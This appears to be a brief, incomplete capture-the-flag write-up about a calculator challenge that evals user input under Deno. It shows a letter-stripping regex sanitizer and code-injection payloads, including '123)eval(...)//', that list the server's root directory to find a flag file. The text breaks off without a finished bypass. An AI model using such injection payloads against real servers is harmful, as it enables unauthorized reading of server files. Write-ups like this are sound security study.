# Clue / Information
There was a trivial bug on our previous calculator's code. Hopefully, this time there won't be a any issues :(

# writeup
What changes between this version and the old one is that the input is sanitized by the following line:
`const sanitizedName = name.replace(/[a-zA-Z]/g, '');`
This replace every letters (lowercase and uppercase) by an empty string '' ... this much harder.
If I try to type the same input as for the previous version: `'for (const entry of Deno.readDirSync("/")) {if (entry.name.search("flag-") != -1) console.log(entry)}'`, after sanitizing we end up with ` (   .("/")) { (..("-") != -1) .()}`

123)eval(for (const entry of Deno.readDirSync("/")) {if (entry.name.search("flag-") != -1) console.log(entry)})))//

["test", "test"]